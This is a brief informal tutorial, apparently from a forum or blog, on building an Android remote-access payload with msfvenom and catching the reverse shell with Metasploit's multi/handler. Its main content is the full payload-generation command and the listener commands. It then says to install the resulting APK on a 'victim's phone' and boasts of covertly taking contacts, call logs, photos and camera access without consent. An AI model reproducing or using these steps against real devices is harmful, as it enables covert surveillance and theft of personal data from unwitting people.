Metasploit

In this tutorial Im gonna teach you android exploitation using metasploit and msfvenom.

Assuming that you have installed the kali linux .
Open terminal and type as
# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.xx.xxx.xx LPORT=4444 R > kali.apk

here you need to find the lhost to find that type
ifconfig
you will see ip address as 192.something.something.something

after that open another terminal and type

msfconsole

after that you will see some images in digital format.

msf  > use multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.something.something.something
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit

Now the apk file (kali.apk) that is kali.apk which is in root you need to install it in victim's phone.

There that is all

After this you will be able to get all the info from your victim's phone to your computer.Without the victim's knowledge
You can get all the contacts,call log,access the camera, get photos from the gallery and much more.
